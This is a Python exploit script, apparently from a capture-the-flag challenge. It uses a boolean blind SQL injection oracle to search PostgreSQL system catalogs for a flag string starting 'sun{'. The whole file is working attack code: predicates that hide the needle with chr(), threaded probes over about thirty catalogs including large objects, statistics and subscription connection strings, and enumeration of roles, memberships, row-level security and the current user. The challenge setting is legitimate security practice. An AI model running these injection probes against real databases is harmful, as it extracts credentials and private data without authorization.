#!/usr/bin/env python
"""Precise hunt for the flag text `sun{` anywhere a query can reach.

The previous sweep tested `LIKE '%{%'`, which every array cast satisfies -- `pg_class.reloptions`
and `pg_db_role_setting.setconfig` both "hit" on ordinary `{security_barrier=true}` output. So
the pattern here is the four characters s,u,n,{ assembled with chr() and matched by position(),
which cannot be satisfied by punctuation accidents, and the control proves the predicate shape
works before any result is believed.
"""
import threading

import extract as E

NEEDLE = "chr(115)||chr(117)||chr(110)||chr(123)"          # s u n {
CTRL = "position(%s in (SELECT 'abc %s def' AS x)::text)>0" % ("chr(115)||chr(117)||chr(110)||chr(123)", "")

SOURCES = [
    ("pg_proc.prosrc", "SELECT prosrc::text AS x FROM pg_proc"),
    ("pg_proc.proconfig", "SELECT proconfig::text AS x FROM pg_proc"),
    ("pg_description", "SELECT description::text AS x FROM pg_description"),
    ("pg_shdescription", "SELECT description::text AS x FROM pg_shdescription"),
    ("pg_seclabel", "SELECT label::text AS x FROM pg_seclabel"),
    ("pg_shseclabel", "SELECT label::text AS x FROM pg_shseclabel"),
    ("pg_enum", "SELECT elemspelling::text AS x FROM pg_enum"),
    ("pg_indexes", "SELECT indexdef::text AS x FROM pg_indexes"),
    ("pg_views", "SELECT definition::text AS x FROM pg_views"),
    ("pg_rules", "SELECT definition::text AS x FROM pg_rules"),
    ("pg_trigger.tgargs", "SELECT tgargs::text AS x FROM pg_trigger"),
    ("pg_policies", "SELECT (p.*)::text AS x FROM pg_policies p"),
    ("pg_ts_dict", "SELECT dictname::text AS x FROM pg_ts_dict"),
    ("pg_conversion", "SELECT conname::text AS x FROM pg_conversion"),
    ("pg_attribute", "SELECT attname::text AS x FROM pg_attribute"),
    ("pg_attribute missing", "SELECT attmissingval::text AS x FROM pg_attribute"),
    ("pg_roles", "SELECT rolname::text||coalesce(rolconfig::text,'') AS x FROM pg_roles"),
    ("pg_largeobject", "SELECT encode(data,'escape') AS x FROM pg_largeobject"),
    ("pg_statistic 1", "SELECT stavalues1::text AS x FROM pg_statistic"),
    ("pg_statistic 2", "SELECT stavalues2::text AS x FROM pg_statistic"),
    ("pg_statistic 3", "SELECT stavalues3::text AS x FROM pg_statistic"),
    ("pg_statistic 4", "SELECT stavalues4::text AS x FROM pg_statistic"),
    ("planets+zleak full", "SELECT (p::text) AS x FROM planets p UNION ALL SELECT (z::text) FROM zleak z"),
    ("pg_database", "SELECT datname::text AS x FROM pg_database"),
    ("pg_db_role_setting", "SELECT setconfig::text AS x FROM pg_db_role_setting"),
    ("pg_tablespace", "SELECT spcname::text AS x FROM pg_tablespace"),
    ("pg_extension", "SELECT extname::text AS x FROM pg_extension"),
    ("pg_event_trigger", "SELECT evtname::text AS x FROM pg_event_trigger"),
    ("pg_publication", "SELECT pubname::text AS x FROM pg_publication"),
    ("pg_subscription", "SELECT subname::text||subconninfo::text AS x FROM pg_subscription"),
    ("pg_foreign_data_wrapper", "SELECT fdwname::text AS x FROM pg_foreign_data_wrapper"),
    ("pg_auth_members", "SELECT array_agg(member::text)::text AS x FROM pg_auth_members"),
]

FACTS = [
    ("current_user", "(SELECT current_user)='probe'"),
    ("roles count", "(SELECT count(*) FROM pg_roles)>3"),
    ("we are member of something", "(SELECT count(*) FROM pg_auth_members m JOIN pg_roles r ON r.oid=m.member WHERE r.rolname=current_user)>0"),
    ("rls enabled anywhere", "(SELECT count(*) FROM pg_class WHERE relrowsecurity OR relforcerowsecurity)>0"),
    ("dropped cols in public", "(SELECT count(*) FROM pg_attribute a JOIN pg_class c ON c.oid=a.attrelid JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND a.attisdropped)>0"),
    ("extensions", "(SELECT count(*) FROM pg_extension)>0"),
]


def probe(sql):
    return "EXISTS(SELECT 1 FROM (%s) t WHERE position(%s in t.x::text)>0)" % (sql, NEEDLE)


if __name__ == "__main__":
    print("[*] control:", E.cond("position(%s in (SELECT 'aa %s bb'::text AS x))>0"
                                % (NEEDLE, "sun{")), flush=True)
    res = {}

    def one(k, e):
        try:
            res[k] = E.cond(probe(e))
        except Exception:
            res[k] = "EXC"
    ts = [threading.Thread(target=one, args=(k, e), daemon=True) for k, e in SOURCES]
    for t in ts:
        t.start()
    for t in ts:
        t.join(120)
    for k, _ in SOURCES:
        print("   %-22s %s" % (k, res.get(k)))
    print("[*] facts")
    for k, e in FACTS:
        try:
            print("   %-26s %s" % (k, E.cond(e)))
        except Exception as ex:
            print("   %-26s EXC" % k)
    print("   current_user =", E.read_str("(SELECT current_user)", 40, "user"))
    print("   roles        =", E.read_str("(SELECT string_agg(rolname,',' ORDER BY rolname) FROM pg_roles)", 400, "roles"))
